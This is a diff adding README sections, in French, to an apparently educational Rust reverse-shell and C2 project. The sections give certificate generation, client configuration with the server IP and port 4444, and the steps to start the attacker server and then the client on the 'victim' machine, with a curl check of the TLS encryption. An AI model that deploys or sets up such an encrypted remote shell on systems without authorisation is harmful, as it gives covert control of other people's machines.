@@ -40,3 +40,64 @@ sequenceDiagram
         Victim->>Victim: Exécution locale
         Victim-->>Attacker: Résultat chiffré
     end
+```
+## Installation et Configuration
+### Prérequis
+- Rust & Cargo installés.
+- OpenSSL (pour la génération des certificats).
+- Environnement conseillé : Windows (Client) et Linux/Docker (Serveur).
+
+### 1. Génération des Certificats (TLS)
+Le serveur a besoin d'une identité cryptographique (.pfx) pour fonctionner. Exécutez cette commande dans le dossier server_c2 :
+
+*Génère un certificat auto-signé et l'exporte en PKCS12 (Mot de passe: "password")*
+```bash
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost" && \
+openssl pkcs12 -export -out identity.pfx -inkey key.pem -in cert.pem -passout pass:password
+```
+
+### 2. Configuration du Client
+Ouvrez le fichier reverse_shell/src/main.rs et modifiez l'IP du serveur :
+
+*Remplacez par l'IP de votre serveur C2 (ex: IP Docker ou IP Locale)* 
+```bash
+const SERVER_IP: &str = "172.17.0.2"; 
+const SERVER_PORT: &str = "4444";
+```
+## Usage
+### Étape 1 : Démarrer le Serveur (Attaquant)
+Placez-vous dans le dossier du serveur (assurez-vous que identity.pfx est présent) :
+
+```bash
+cd server_c2
+cargo run
+```
+*Le serveur se met en écoute sur le port 4444.*
+### Étape 2 : Démarrer le Client (Victime)
+
+Sur la machine cible :
+
+```bash
+cd reverse_shell
+cargo run
+```
+### Étape 3 : Interaction
+
+<img width="892" height="827" alt="image" src="https://github.com/user-attachments/assets/78362776-ced6-49d3-a931-9e06fd09aab6" />
+
+## Preuve de Sécurité (TLS)
+
+Pour vérifier que le chiffrement fonctionne et que les commandes ne passent pas en clair :
+
+#### Test négatif avec CURL : Essayer de se connecter au serveur avec un protocole non sécurisé (http) :
+```bash
+curl -v http://127.0.0.1:4444
+```
+*Résultat : Le serveur rejette la connexion (Empty reply) et log une erreur TLS.*
+
+## Auteur
+
+Mohamed MESRI
+
+
+
